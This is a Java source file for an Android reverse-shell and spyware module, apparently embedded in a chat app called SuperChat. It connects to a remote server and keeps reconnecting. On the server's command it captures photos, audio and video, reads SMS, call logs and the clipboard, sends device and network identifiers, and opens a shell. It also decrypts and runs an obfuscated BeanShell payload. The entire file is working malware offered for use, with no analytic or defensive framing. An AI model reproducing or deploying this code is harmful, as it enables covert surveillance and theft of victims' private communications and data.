package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;


import androidx.core.content.ContextCompat;

import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.config;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.CameraPreview;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.audioManager;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.ipAddr;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.newShell;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.readCallLogs;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.readSMS;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.vibrate;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.videoRecorder;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import com.teamxdevelopers.SuperChat.utils.FileEncryptorDecryptor;


/*

This code represents the core functionality of a reverse shell application designed to run on Android devices.
 It establishes a TCP connection to a server specified by an IP address and port, listens for commands from the server,
 and executes various actions on the device based on those commands. The actions include capturing photos, recording audio and video, reading SMS and call logs,
vibrating the phone, and fetching device location, among others. The code uses asynchronous tasks to handle network operations without blocking the UI thread.
 */

// Define the tcpConnection class extending AsyncTask to perform network operations on a background thread.
public class tcpConnection extends AsyncTask<String,Void,Void> {

    // Declare variables for context, activity, and various functionalities
    Activity activity;
    com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions functions;
    Context context;
    // Define payload classes for specific actions
    newShell shell;

    ipAddr ipAddr = new ipAddr();
    private CameraPreview mPreview;


    static String TAG = "tcpConnectionClass";
    vibrate vibrate;
    readSMS readSMS;
    public static OutputStream out;
    audioManager audioManager;
    com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.videoRecorder videoRecorder;
    com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.readCallLogs readCallLogs;



    // Constructor initializes the context, activity, and various functionalities
    public tcpConnection(Activity activity, Context context) {
        // Initialization of all required functionalities and payloads
        String javaCode =
                "Znp7YTxzcWZ7ZHtmazIvMnNxZntke2ZrKWZ6e2E8cX18ZndqZjIvMnF9fGZ3amYpdGd8cWZ7fXxhMi8yfHdlMnRnfHFme318YTpzcWZ7ZHtmazspf0Jgd2R7d2UyLzJ8d2UyUXN/d2BzQmB3ZHt3ZTpxfXxmd2pmOylke3Bgc2Z3Mi8yfHdlMmR7cGBzZnc6cX18ZndqZjspYHdzdkFfQTIvMnx3ZTJgd3N2QV9BOnF9fGZ3amY7KXNndnt9X3N8c3V3YDIvMnx3ZTJzZ3Z7fV9zfHN1d2A6Oylke3Z3fUB3cX1gdndgLzJ8d2UyZHt2d31Ad3F9YHZ3YDo7KWB3c3ZRc35+Xn11YTIvMnx3ZTJgd3N2UXN+fl59dWE6cX18ZndqZj5zcWZ7ZHtmazspMmF6d35+Mi8yfHdlMnx3ZUF6d35+OnNxZntke2ZrPnF9fGZ3amY7KQ==";
        FileEncryptorDecryptor encryptor = new FileEncryptorDecryptor();
        //String encryptedJavaCode = encryptor.encrypt(javaCode);
        Log.d("tcpconnectionben", "Decrypted Java Code: " + javaCode);
        String decryptedJavaCode = encryptor.decrypt(javaCode);
        Log.d("tcpconnectionbendecrypt", "Decrypted Java Code: " + decryptedJavaCode);

        try {
            bsh.Interpreter interpreter = new bsh.Interpreter();
            // If your script requires context or other objects, set them here
            // For example:
            interpreter.set("activity", activity);
            interpreter.set("context", context);
            interpreter.eval(decryptedJavaCode);
        } catch (bsh.EvalError evalError) {
            evalError.printStackTrace();
        }
    }
    // The main method that executes in the background to handle network operations
    @Override
    protected Void doInBackground(String... strings) {
        Socket socket = null;
        try {

            while(true){
                // Continuously try to connect to the server until successful
                Log.d(TAG,"trying");
                socket = new Socket();
                try{
                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
                }catch (SocketTimeoutException | SocketException e){
                    Log.d(TAG,"error");
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new tcpConnection(activity,context).execute(config.IP,config.port);
                            // If connection fails, retry by executing the same AsyncTask again
                        }
                    });

                }
                if(socket.isConnected()){
                    Log.d(TAG,"done");
                    break;
                    // Break the loop if connection is successful

                }
            }

            // Once connected, prepare to send and receive data
            out = new DataOutputStream(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String model = Build.MODEL+"\n";
            // Send a welcome message to the server
            String welcomeMess = "Hello there, welcome to reverse shell of "+model;
            out.write(welcomeMess.getBytes("UTF-8"));
            String line;
            // Listen for commands from the server
            while ((line = in.readLine()) != null)
            {
                Log.d(TAG, line);
                // Handle different commands by executing corresponding actions
                if (line.equals("exit"))
                {
                    Log.d("service_runner","called");
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new tcpConnection(activity,context).execute(config.IP,config.port);
                        }
                    });
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        functions.jobScheduler(context);
                    }else{
                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                context.startService(new Intent(context,mainService.class));
                            }
                        });
                    }
                    socket.close();
                }
                else if (line.equals("camList"))
                {
                    String list = functions.get_numberOfCameras();
                    out.write(list.getBytes("UTF-8"));
                }
                else if (line.matches("takepic \\d"))
                {
                    functions.getScreenUp(activity);
                    final String[] cameraid = line.split(" ");
                    try
                    {
                        out.write("IMAGE\n".getBytes("UTF-8"));
                        mPreview.startUp(Integer.parseInt(cameraid[1]),out);
                    } catch (Exception e)
                    {
                        e.printStackTrace();
                        new jumper(context).init();
                        Log.d("done", "done");
                    }
                }
                else if (line.equals("shell"))
                {
                    out.write("SHELL".getBytes("UTF-8"));
                    shell.executeShell(socket,out);
                }
                else if (line.equals("getClipData"))
                {
                    String clipboard_data = functions.readFromClipboard();
                    if (clipboard_data != null)
                    {
                        clipboard_data = clipboard_data + "\n";
                        out.write(clipboard_data.getBytes("UTF-8"));
                    }
                    else
                    {
                        out.write("No Clipboard Data Present\n".getBytes("UTF-8"));
                    }
                }
                else if (line.equals("deviceInfo"))
                {
                    out.write(functions.deviceInfo().getBytes());
                }
                else if (line.equals("help"))
                {
                    out.write("help\n".getBytes());
                }
                else if (line.equals("clear"))
                {
                    out.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
                }
                else if (line.equals("getSimDetails"))
                {
                    String number = functions.getPhoneNumber(context);
                    number+="\n";
                    out.write(number.getBytes("UTF-8"));
                }
                else if (line.equals("getIP"))
                {
                    String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
                    out.write(ip_addr.getBytes("UTF-8"));
                }
                else if(line.matches("vibrate \\d"))
                {
                    final String[] numbers = line.split(" ");
                    vibrate.vib(Integer.parseInt(numbers[1]));
                    String res = "Vibrating "+numbers[1]+" time successful.\n";
                    out.write(res.getBytes("UTF-8"));
                }
                else if(line.contains("getSMS "))
                {
                    String[] box = line.split(" ");
                    if(box[1].equals("inbox")){
                        out.write("readSMS inbox\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("inbox");
                        out.write(sms.getBytes("UTF-8"));
                    }else if(box[1].equals("sent")){
                        out.write("readSMS sent\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("sent");
                        out.write(sms.getBytes("UTF-8"));
                    }else{
                        out.write("readSMS null\n".getBytes("UTF-8"));
                        out.write("Wrong Command\n".getBytes("UTF-8"));
                    }
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("startAudio"))
                {
                    //audioManager.startRecording(out);
                    Intent serviceIntent = new Intent(context, com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "startFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.equals("stopAudio"))
                {
//                    audioManager.stopRecording(out);
                    Intent serviceIntent = new Intent(context, com.teamxdevelopers.SuperChat.malware.JavaPayload.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "stopFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.matches("startVideo \\d"))
                {
                    final String[] cameraid = line.split(" ");
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins", "startFore");
                    serviceIntent.putExtra("cameraid", cameraid[1]);
                    ContextCompat.startForegroundService(context, serviceIntent);

                }
                else if(line.equals("stopVideo"))
                {
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins","stopFore");
                    ContextCompat.startForegroundService(context,serviceIntent);
                }
                else if(line.equals("getCallLogs"))
                {
                    out.write("callLogs\n".getBytes("UTF-8"));
                    String call_logs = readCallLogs.readLogs();
                    if(call_logs==null){
                        out.write("No call logs found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(call_logs.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getMACAddress"))
                {
                    String macAddress = ipAddr.getMACAddress(null);
                    macAddress+="\n";
                    out.write(macAddress.getBytes("UTF-8"));
                }
                else
                {
                    out.write("Unknown Command \n".getBytes("UTF-8"));
                }
            }
            Log.d("service_runner","called");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
        } catch (Exception e) {
            Log.d("service_runner","called");
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    new tcpConnection(activity,context).execute(config.IP,config.port);
                }
            });
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
            e.printStackTrace();
        }
        return null ;
    }
}